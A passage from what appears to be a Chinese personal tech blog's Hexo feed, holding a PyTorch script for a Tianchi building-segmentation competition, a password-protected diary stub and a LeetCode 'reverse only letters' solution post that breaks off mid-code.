<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy as np</span><br><span class="line"><span class="keyword">import</span> pandas as pd</span><br><span class="line"><span class="keyword">import</span> pathlib, sys, os, random, time</span><br><span class="line"><span class="keyword">import</span> numba, cv2, gc</span><br><span class="line">from tqdm <span class="keyword">import</span> tqdm_notebook</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot as plt</span><br><span class="line">%matplotlib <span class="keyword">inline</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(&#x27;ignore&#x27;)</span><br><span class="line"></span><br><span class="line">from tqdm.notebook <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="meta"># albumentations 是一个给予 OpenCV的快速训练数据增强库,拥有非常简单且强大的可以用于多种任务(分割、检测)的接口,易于定制且添加其他框架非常方便</span></span><br><span class="line"><span class="keyword">import</span> albumentations as A</span><br><span class="line">#Rasterio是基于GDAL库二次封装的更加符合Python风格的主要用于空间栅格数据处理的Python库</span><br><span class="line"><span class="keyword">import</span> rasterio</span><br><span class="line">from rasterio.windows <span class="keyword">import</span> Window</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">rle_encode</span><span class="params">(im)</span>:</span></span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    im: numpy <span class="built_in">array</span>, <span class="number">1</span> - mask, <span class="number">0</span> - background</span><br><span class="line">    Returns run length as <span class="built_in">string</span> formated</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    pixels = im.flatten(order = <span class="string">&#x27;F&#x27;</span>)</span><br><span class="line">    pixels = np.concatenate([[<span class="number">0</span>], pixels, [<span class="number">0</span>]])</span><br><span class="line">    runs = np.where(pixels[<span class="number">1</span>:] != pixels[:<span class="number">-1</span>])[<span class="number">0</span>] + <span class="number">1</span></span><br><span class="line">    runs[<span class="number">1</span>::<span class="number">2</span>] -= runs[::<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join(str(x) <span class="keyword">for</span> x in runs)</span><br><span class="line"></span><br><span class="line">def rle_decode(mask_rle, shape=(<span class="number">512</span>, <span class="number">512</span>)):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    mask_rle: run-length as <span class="built_in">string</span> formated (start length)</span><br><span class="line">    shape: (height,width) of <span class="built_in">array</span> to <span class="keyword">return</span> </span><br><span class="line">    Returns numpy <span class="built_in">array</span>, <span class="number">1</span> - mask, <span class="number">0</span> - background</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    s = mask_rle.split()</span><br><span class="line">    starts, lengths = [np.asarray(x, dtype=<span class="keyword">int</span>) <span class="keyword">for</span> x in (s[<span class="number">0</span>:][::<span class="number">2</span>], s[<span class="number">1</span>:][::<span class="number">2</span>])]</span><br><span class="line">    starts -= <span class="number">1</span></span><br><span class="line">    ends = starts + lengths</span><br><span class="line">    img = np.zeros(shape[<span class="number">0</span>]*shape[<span class="number">1</span>], dtype=np.uint8)</span><br><span class="line">    <span class="keyword">for</span> lo, hi in zip(starts, ends):</span><br><span class="line">        img[lo:hi] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> img.reshape(shape, order=<span class="string">&#x27;F&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn as nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional as F</span><br><span class="line"><span class="keyword">import</span> torch.utils.data as D</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line">from torchvision <span class="keyword">import</span> transforms as T</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EPOCHES = <span class="number">20</span></span><br><span class="line">BATCH_SIZE = <span class="number">16</span></span><br><span class="line"># BATCH_SIZE = <span class="number">32</span></span><br><span class="line">IMAGE_SIZE = <span class="number">256</span></span><br><span class="line">DEVICE = &#x27;cuda&#x27; if torch.cuda.is_available() else &#x27;cpu&#x27; </span><br><span class="line"></span><br><span class="line">trfm = A.Compose([</span><br><span class="line">    A.Resize(IMAGE_SIZE, IMAGE_SIZE),</span><br><span class="line">    A.HorizontalFlip(p=<span class="number">0.5</span>),</span><br><span class="line">    A.VerticalFlip(p=<span class="number">0.5</span>),</span><br><span class="line">    A.RandomRotate90(),</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class TianChiDataset(D.Dataset):</span><br><span class="line">    def __init__(self, paths, rles, transform, test_mode=False):</span><br><span class="line">        self.paths = paths</span><br><span class="line">        self.rles = rles</span><br><span class="line">        self.transform = transform</span><br><span class="line">        self.test_mode = test_mode</span><br><span class="line">        </span><br><span class="line">        self.len = len(paths)</span><br><span class="line">        self.as_tensor = T.Compose([</span><br><span class="line">            T.ToPILImage(),</span><br><span class="line">            T.Resize(IMAGE_SIZE),</span><br><span class="line">            T.ToTensor(),</span><br><span class="line">            T.Normalize([<span class="number">0.625</span>, <span class="number">0.448</span>, <span class="number">0.688</span>],</span><br><span class="line">                        [<span class="number">0.131</span>, <span class="number">0.177</span>, <span class="number">0.101</span>]),</span><br><span class="line">        ])</span><br><span class="line">        </span><br><span class="line">    # get data operation</span><br><span class="line">    def __getitem__(self, index):</span><br><span class="line">        img = cv2.imread(self.paths[index])</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.test_mode:</span><br><span class="line">            mask = rle_decode(self.rles[index])</span><br><span class="line">            augments = self.transform(image=img, mask=mask)</span><br><span class="line">            return self.as_tensor(augments[&#x27;image&#x27;]), augments[&#x27;mask&#x27;][None]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            return self.as_tensor(img), &#x27;&#x27;        </span><br><span class="line">    </span><br><span class="line">    def __len__(self):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Total number of samples in the dataset</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self.len</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">train_mask = pd.read_csv(&#x27;./train_mask.csv&#x27;, sep=&#x27;\t&#x27;, names=[&#x27;name&#x27;, &#x27;mask&#x27;])</span><br><span class="line">train_mask[&#x27;name&#x27;] = train_mask[&#x27;name&#x27;].apply(lambda x: &#x27;./train/&#x27; + x)</span><br><span class="line"></span><br><span class="line">img = cv2.imread(train_mask[&#x27;name&#x27;].iloc[0])</span><br><span class="line">mask = rle_decode(train_mask[&#x27;mask&#x27;].iloc[0])</span><br><span class="line"></span><br><span class="line">print(rle_encode(mask) == train_mask[&#x27;mask&#x27;].iloc[0])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dataset = TianChiDataset(</span><br><span class="line">    train_mask[&#x27;name&#x27;].values,</span><br><span class="line">    train_mask[&#x27;mask&#x27;].fillna(&#x27;&#x27;).values,</span><br><span class="line">    trfm, False</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">image, mask = dataset[<span class="number">0</span>]</span><br><span class="line">plt.figure(figsize=(<span class="number">16</span>,<span class="number">8</span>))</span><br><span class="line">plt.subplot(<span class="number">121</span>)</span><br><span class="line">plt.imshow(mask[0], cmap=&#x27;gray&#x27;)</span><br><span class="line">plt.subplot(<span class="number">122</span>)</span><br><span class="line">plt.imshow(image[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">valid_idx, train_idx = [], []</span><br><span class="line"><span class="keyword">for</span> i in range(len(dataset)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">7</span> == <span class="number">0</span>:</span><br><span class="line">        valid_idx.append(i)</span><br><span class="line">#     <span class="keyword">else</span>:</span><br><span class="line">    elif i % <span class="number">7</span> == <span class="number">1</span>:</span><br><span class="line">        train_idx.append(i)</span><br><span class="line">        </span><br><span class="line">train_ds = D.Subset(dataset, train_idx)</span><br><span class="line">valid_ds = D.Subset(dataset, valid_idx)</span><br><span class="line"></span><br><span class="line"># define training <span class="keyword">and</span> validation data loaders</span><br><span class="line">loader = D.DataLoader(</span><br><span class="line">    train_ds, batch_size=BATCH_SIZE, shuffle=True, num_workers=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">vloader = D.DataLoader(</span><br><span class="line">    valid_ds, batch_size=BATCH_SIZE, shuffle=False, num_workers=<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"> def get_model():</span><br><span class="line">    model = torchvision.models.segmentation.fcn_resnet50(True)</span><br><span class="line">    </span><br><span class="line">#     pth = torch.load(<span class="string">&quot;../input/pretrain-coco-weights-pytorch/fcn_resnet50_coco-1167a1af.pth&quot;</span>)</span><br><span class="line">#     <span class="keyword">for</span> key in [<span class="string">&quot;aux_classifier.0.weight&quot;</span>, <span class="string">&quot;aux_classifier.1.weight&quot;</span>, <span class="string">&quot;aux_classifier.1.bias&quot;</span>, <span class="string">&quot;aux_classifier.1.running_mean&quot;</span>, <span class="string">&quot;aux_classifier.1.running_var&quot;</span>, <span class="string">&quot;aux_classifier.1.num_batches_tracked&quot;</span>, <span class="string">&quot;aux_classifier.4.weight&quot;</span>, <span class="string">&quot;aux_classifier.4.bias&quot;</span>]:</span><br><span class="line">#         del pth[key]</span><br><span class="line">    </span><br><span class="line">    model.classifier[<span class="number">4</span>] = nn.Conv2d(<span class="number">512</span>, <span class="number">1</span>, kernel_size=(<span class="number">1</span>, <span class="number">1</span>), stride=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line">@torch.no_grad()</span><br><span class="line">def validation(model, loader, loss_fn):</span><br><span class="line">    losses = []</span><br><span class="line">    model.eval()</span><br><span class="line">    <span class="keyword">for</span> image, target in loader:</span><br><span class="line">        image, target = image.to(DEVICE), target.<span class="keyword">float</span>().to(DEVICE)</span><br><span class="line">        output = model(image)[&#x27;out&#x27;]</span><br><span class="line">        loss = loss_fn(output, target)</span><br><span class="line">        losses.append(loss.item())</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> np.<span class="built_in">array</span>(losses).mean()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">model = get_model()</span><br><span class="line">model.to(DEVICE);</span><br><span class="line"></span><br><span class="line">optimizer = torch.optim.AdamW(model.parameters(),</span><br><span class="line">                  lr=<span class="number">1e-4</span>, weight_decay=<span class="number">1e-3</span>)</span><br><span class="line"></span><br><span class="line">class SoftDiceLoss(nn.Module):</span><br><span class="line">    def __init__(self, smooth=<span class="number">1.</span>, dims=(<span class="number">-2</span>,<span class="number">-1</span>)):</span><br><span class="line"></span><br><span class="line">        super(SoftDiceLoss, self).__init__()</span><br><span class="line">        self.smooth = smooth</span><br><span class="line">        self.dims = dims</span><br><span class="line">    </span><br><span class="line">    def forward(self, x, y):</span><br><span class="line">        tp = (x * y).sum(self.dims)</span><br><span class="line">        fp = (x * (<span class="number">1</span> - y)).sum(self.dims)</span><br><span class="line">        fn = ((<span class="number">1</span> - x) * y).sum(self.dims)</span><br><span class="line">        </span><br><span class="line">        dc = (<span class="number">2</span> * tp + self.smooth) / (<span class="number">2</span> * tp + fp + fn + self.smooth)</span><br><span class="line">        dc = dc.mean()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> - dc</span><br><span class="line">    </span><br><span class="line">bce_fn = nn.BCEWithLogitsLoss()</span><br><span class="line">dice_fn = SoftDiceLoss()</span><br><span class="line"></span><br><span class="line">def loss_fn(y_pred, y_true):</span><br><span class="line">    bce = bce_fn(y_pred, y_true)</span><br><span class="line">    dice = dice_fn(y_pred.sigmoid(), y_true)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0.8</span>*bce+ <span class="number">0.2</span>*dice</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">header = r<span class="number">&#x27;&#x27;&#x27;</span></span><br><span class="line">        Train | Valid</span><br><span class="line">Epoch |  Loss |  Loss | Time, m</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">#          Epoch         metrics            time</span><br><span class="line">raw_line = &#x27;&#123;:6d&#125;&#x27; + &#x27;\u2502&#123;:7.3f&#125;&#x27;*2 + &#x27;\u2502&#123;:6.2f&#125;&#x27;</span><br><span class="line">print(header)</span><br><span class="line"></span><br><span class="line">EPOCHES = <span class="number">5</span></span><br><span class="line">best_loss = <span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> epoch in range(<span class="number">1</span>, EPOCHES+<span class="number">1</span>):</span><br><span class="line">    losses = []</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    model.train()</span><br><span class="line">    <span class="keyword">for</span> image, target in tqdm_notebook(loader):</span><br><span class="line">        </span><br><span class="line">        image, target = image.to(DEVICE), target.<span class="keyword">float</span>().to(DEVICE)</span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        output = model(image)[&#x27;out&#x27;]</span><br><span class="line">        loss = loss_fn(output, target)</span><br><span class="line">        loss.backward()</span><br><span class="line">        optimizer.step()</span><br><span class="line">        losses.append(loss.item())</span><br><span class="line">        # print(loss.item())</span><br><span class="line">        </span><br><span class="line">    vloss = validation(model, vloader, loss_fn)</span><br><span class="line">    print(raw_line.format(epoch, np.<span class="built_in">array</span>(losses).mean(), vloss,</span><br><span class="line">                              (time.time()-start_time)/<span class="number">60</span>**<span class="number">1</span>))</span><br><span class="line">    losses = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> vloss &lt; best_loss:</span><br><span class="line">        best_loss = vloss</span><br><span class="line">        torch.save(model.state_dict(), &#x27;./model_best.pth&#x27;)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">trfm = T.Compose([</span><br><span class="line">    T.ToPILImage(),</span><br><span class="line">    T.Resize(IMAGE_SIZE),</span><br><span class="line">    T.ToTensor(),</span><br><span class="line">    T.Normalize([<span class="number">0.625</span>, <span class="number">0.448</span>, <span class="number">0.688</span>],</span><br><span class="line">                [<span class="number">0.131</span>, <span class="number">0.177</span>, <span class="number">0.101</span>]),</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">subm = []</span><br><span class="line"></span><br><span class="line">model.load_state_dict(torch.load(<span class="string">&quot;./model_best.pth&quot;</span>))</span><br><span class="line">model.eval()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test_mask = pd.read_csv(&#x27;./test_a_samplesubmit.csv&#x27;, sep=&#x27;\t&#x27;, names=[&#x27;name&#x27;, &#x27;mask&#x27;])</span><br><span class="line">test_mask[&#x27;name&#x27;] = test_mask[&#x27;name&#x27;].apply(lambda x: &#x27;./test_a/&#x27; + x)</span><br><span class="line"></span><br><span class="line">for idx, name in enumerate(tqdm_notebook(test_mask[&#x27;name&#x27;].iloc[:])):</span><br><span class="line">    image = cv2.imread(name)</span><br><span class="line">    image = trfm(image)</span><br><span class="line">    with torch.no_grad():</span><br><span class="line">        image = image.to(DEVICE)[None]</span><br><span class="line">        score = model(image)[&#x27;out&#x27;][0][0]</span><br><span class="line">        score_sigmoid = score.sigmoid().cpu().numpy()</span><br><span class="line">        score_sigmoid = (score_sigmoid &gt; <span class="number">0.5</span>).astype(np.uint8)</span><br><span class="line">        score_sigmoid = cv2.resize(score_sigmoid, (<span class="number">512</span>, <span class="number">512</span>))</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        # <span class="keyword">break</span></span><br><span class="line">    subm.append([name.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">-1</span>], rle_encode(score_sigmoid)])</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">subm = pd.DataFrame(subm)</span><br><span class="line">subm.to_csv(&#x27;./tmp.csv&#x27;, index=None, header=None, sep=&#x27;\t&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plt.figure(figsize=(<span class="number">16</span>,<span class="number">8</span>))</span><br><span class="line">plt.subplot(<span class="number">121</span>)</span><br><span class="line">plt.imshow(rle_decode(subm[1].fillna(&#x27;&#x27;).iloc[0]), cmap=&#x27;gray&#x27;)</span><br><span class="line">plt.subplot(<span class="number">122</span>)</span><br><span class="line">plt.imshow(cv2.imread(&#x27;./test_a/&#x27; + subm[0].iloc[0]));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="模型结果"><a href="#模型结果" class="headerlink" title="模型结果"></a>模型结果</h5><p><img src="/2021/03/12/%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2-%E5%9C%B0%E8%A1%A8%E5%BB%BA%E7%AD%91%E7%89%A9%E8%AF%86%E5%88%AB/9968CA0521CED79554B68EAFBC7B24ED.png" alt="img"></p>
<p><img src="/2021/03/12/%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2-%E5%9C%B0%E8%A1%A8%E5%BB%BA%E7%AD%91%E7%89%A9%E8%AF%86%E5%88%AB/image-20210316152506215.png" alt="image-20210316152506215"></p>
]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>天池</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>图像加密综述</title>
    <url>/2021/03/15/%E5%9B%BE%E5%83%8F%E5%8A%A0%E5%AF%86%E7%BB%BC%E8%BF%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script>]]></content>
      <categories>
        <category>复杂网络与图像加密</category>
      </categories>
      <tags>
        <tag>图像加密</tag>
      </tags>
  </entry>
  <entry>
    <title>Stand out or get out!</title>
    <url>/2021/03/16/2021-03-14/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="4baf0e965ec1f48485292e7f357af4a848d6144136a8f351cc8fd4719e122bca">04b96cf03f1b5d00286d72390b6bf2e0817acbfddb7147d2fcc01912c7f5c0f9713c9c317ba53b9347fde83c930f8c77af411014f8ec84eef7465f6027f6e56361da453a696c51ea2cf726ce74f4d1f870ba487ed6f2d242104af5c0877116b7f14bfb7a90c5973d12ee403d2035f9933239ae2447ed66790333bdf54ffb591262e25fa12dbcf137d44c19a6cd948ebafb15e73fa6eff6dc060b9040f5fe74ceda47dc32b97d576023487f051b3ba548d6ba50e2b500f2040aef18f59839ab6e1e75f19b19b2197541d212a3b8a50be74d4dcb775f19746dc5f65bb1d14038106d809a8f516785e6e320975209525d369518b3e93b5bec268679dda1396e30afe69c8f882a0bd5eacf54f501c1e3d2ec1f5da0f913213670df08e0d6b80fcb4e1d0ec20f707f4071b86f06c11b924808a24ea26802e5e3ece4cc7f2026634001dc7b30d2edbf783ecdf08f087c7aa29f82a33bb14ae64478f6a67b491feefc51c9c63d8bd6fb6ba6fc25fb5b88485aa2ea04c52c1e285942320f50ce7d1669da7f5cebc5d547366a380e79cb3cf405df9df511a1a953796d0cce13a5cf38e725c6fe3e01f62af5f1beebd273efbab7b89eb9f334829ab143f790d0b5ba59b9e332ea1d34e3d0f28844cc197c8569c35e5dc9fd5da5b146bac70b5ca5799ac170481cab403f873d2ee55ed28a925b68c3ae5005e46a1526726732ca78d4e6f53651f1fabdfa6f5a20e9c994b4131e476fcdeb1d4ae469a1e28bf80136102424dc059ae0f0e414fe44e68025cf1d595866d466c1895109eb77cd621417e8f5e8ca15fb1991af16f0ff84bdf1053ce0fdfd58cef97a092aab113e33b0afc77adf17b9a914729c7cce69a30bf417a294989b5b00fe96e38b3ebbe8b331f42109ee4cc9c8a5fa4944cf7ca93c058ddfc9a70d1b0676856a9ca5816702628513115ada2a545ec82147ff09621314710138f97925b43cf77f8fdb20e0db60a7e637b431492b8937543ac5b35d85a971040dc6e012b9045d3c11e4299609ac838b700bafc00be7549a61b7f80a38832cf10916c047feb7c3f1c3bcdf9b75fd7a368e9b68be128f83e1e239fe180ca424c49a3ac2c96e30d379c8bc98d68f710d01415480c07f34fe1c1ca1c835c43458d903c09148533aecc11bead3fc991b8306629720b9c3ddb777c583034084da3f93248301b83b8c24c56082b4d6277454771a666cb51af0aaf42881979f44154e817c2fd08fb0f6af8cf3519947b272581001eaa19e9d1f7bd7066456a6b7bd0147366605522ea696369556a734932c1a9affe2ddb5b93b74438d6b56207ef0ca439dfedc9c00bbf019e5460bb6f1cd8b85f96f9782a33cc7ae6b6d2bdf00ff1e155b9f2385096244b42b879dbe681e017c75d9c0516e11f798999c95c17122f6e0039e1a983f93eeeae78397777bbd767c5935673552db3330b6026643a16c73d0f713bde360de7b663925b9152dfd3c5e00669604f334d0471679114e0eaec518515d42f9dbcdae223a0e03d3fcc022240034fbb1abbfdb708c88371d4d94134951e76e5cb662b009a91c179bf896271dbdfd27d7f0f24e94e52a87095af5ac9c61b19dd98e0b341b3ebabcd135d0a88c40cfe941eb3e2c92c6f1ba97d36b3ddc65e8953d59039204604e998dca127f7b455e8605db5f4d8b3cb2e0fd1bf3c89af776dd893ecef641f0e36d8734c16a9ebdb1ec91b011beaf7dd14d5efc2bd5f012b582178f174cc80678164dd2a6c2772b5812ed2dbcc52102905e2bceffa0a1a89701a8eddad472768d61fd8f207776d761fd49488bd0317e45a1b133768f8c4ee43727e69a7b22bddcf3021cac8875e5dc36066924905d676eeb86ba8616915f0107baeebf04e2c564b0a3486e84297f7510ec74eed3e8a347a426581b1da7307f05cff1fed2055d2680afb9e6712691c98f2ad210fd0baf291aaa1ff93fc6647571e25b19f7d3f8f129b84d18ddcb322892b063f164bfbea88789ce141882bd6922b44dc02c21c5d0af0f7f3813a6c98b8301eef42e5cfadfadd9e931579c8f1420fb1522001edb1fd90af745a34801ad47c59870df68e5d2de7512020c439c7a817a2cbe9ff36bbe3605c3f1d35baa10511916fb34d0dc33ff7788cb5e3b25b8971fe07dc19c0c220994dd159cb783e0080d1f7f39a369762771a315bf6dbfa33447a201d1161842d4acd9f1a4b620059e91053cd618cbcc35e49b7eb7ced78b4d1ef04b1709298bf5472397ba13f6d9e6d630856642c4965da8339a8dadacefb330923731d8819aa815d512038e3c93a0480f0d9c4b0575eb6da3f2eecb965951470c6b028aa4817d8f456a189a399cc17ba9eeca6911abc3d07ae1056353074315d5a6a1ffa05d40df0d495c62eb32df7ab73b34ba1bfbbf8bb7fffe3abe1ce76025cfa75e06fe812e10a6dee626a7c9eb52fae77e9707e0a5f5c6d5538a9f703f2d2f51412a5e14ea109764d9fae5ff5100d444b74303e38e93fa631b6644fec442b2f37cc5f9bbad3e2a3d11fb9fe9d955876692139d32189604973a92078cf048a44992e3893b24abb9d303980cee9012ba6f7b3f0480c885f3d41f2f17edb5a7f35cf2f5c91b58574db45ceb6559cb76ff8bfe982741ab1a4fcce64b5a2e</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Diary</category>
      </categories>
  </entry>
  <entry>
    <title>仅仅反转字母</title>
    <url>/2021/03/16/%E4%BB%85%E4%BB%85%E5%8F%8D%E8%BD%AC%E5%AD%97%E6%AF%8D/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/reverse-only-letters/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定一个字符串 <code>S</code>，返回 “反转后的” 字符串，其中不是字母的字符都保留在原地，而所有字母的位置发生反转。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;ab-cd&quot;</span><br><span class="line">输出：&quot;dc-ba&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;a-bC-dEf-ghIj&quot;</span><br><span class="line">输出：&quot;j-Ih-gfE-dCba&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;Test1ng-Leet&#x3D;code-Q!&quot;</span><br><span class="line">输出：&quot;Qedo1ct-eeLg&#x3D;ntse-T!&quot;</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li><code>S.length &lt;= 100</code></li>
<li><code>33 &lt;= S[i].ASCIIcode &lt;= 122</code> </li>
<li><code>S</code> 中不包含 <code>\</code> or <code>&quot;</code></li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong>双指针法，索引<code>i</code>从前向后查找字母，索引<code>j</code>从后向前查找字母，然后使用swap交换前后两个字母。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败34.86%，内存消耗5.9M，击败89.58%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">reverseOnlyLetters</span><span class="params">(<span class="built_in">string</span> S)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp1=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> tmp2=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j=S.length()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;j;)&#123;</span><br><span class="line">            tmp1=S[i];</span><br><span class="line">            tmp2=S[j];</span><br><span class="line">            <span class="keyword">if</span>(tmp1&gt;<span class="number">64</span>&amp;&amp;tmp1&lt;<span class="number">91</span> || tmp1&gt;<span class="number">96</span>&amp;&amp;tmp1&lt;<span class="number">123</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(tmp2&gt;<span class="number">64</span>&amp;&amp;tmp2&lt;<span class="number">91</span> || tmp2&gt;<span class="number">96</span>&amp;&amp;tmp2&lt;<span class="number">123</span>)&#123;</span><br><span class="line">                    swap(S[i],S[j]);</span><br><span class="line">                    i++;</span><br><span class="line">                    j--;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    j--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> S;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/reverse-only-letters/solution/jin-jin-fan-zhuan-zi-mu-by-leetcode/">官方题解</a>:</h6><p><strong>方法一：字母栈</strong></p>
<p><strong>想法和算法</strong></p>
<p>将 <code>s</code> 中的所有字母单独存入栈中，所以出栈等价于对字母反序操作。（或者，可以用数组存储字母并反序数组。）</p>
<p>然后，遍历 <code>s</code> 的所有字符，如果是字母我们就选择栈顶元素输出。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">reverseOnlyLetters</span><span class="params">(String S)</span> </span>&#123;</span><br><span class="line">        Stack&lt;Character&gt; letters = <span class="keyword">new</span> Stack();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> c: S.toCharArray())</span><br><span class="line">            <span class="keyword">if</span> (Character.isLetter(c))</span><br><span class="line">                letters.push(c);</span><br><span class="line"></span><br><span class="line">        StringBuilder ans = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> c: S.toCharArray()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Character.isLetter(c))</span><br><span class="line">                ans.append(letters.pop());</span><br><span class="line">            <span 